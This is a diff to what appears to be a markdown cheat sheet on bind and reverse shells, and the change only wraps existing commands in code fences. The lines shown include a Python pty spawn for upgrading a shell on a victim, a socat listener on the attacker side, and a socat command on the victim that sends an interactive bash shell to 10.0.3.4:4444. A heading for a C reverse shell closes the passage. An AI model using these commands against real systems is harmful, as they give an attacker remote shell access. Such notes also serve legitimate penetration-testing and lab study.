@@ -37,9 +37,9 @@ There are two ways to access a shell (bind shell and reverse shell)
 using python
 
   on victim:
-     
+    ``` 
     python3 -c 'import pty; pty.spawn("/bin/bash")'
-    
+    ```
     (press on your keyboard) Ctrl+Z
 
     (press on your keyboard) Enter
@@ -62,13 +62,14 @@ using python
     
  using socat:
  on host(attacker):
- 
+ ```bash
     socat file:`tty`,raw,echo=0 tcp-listen:4444
-  
+ ``` 
  on victim :
- 
+
+```bash
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
-  
+```
     
 # C reverse shell (shell.c)
 
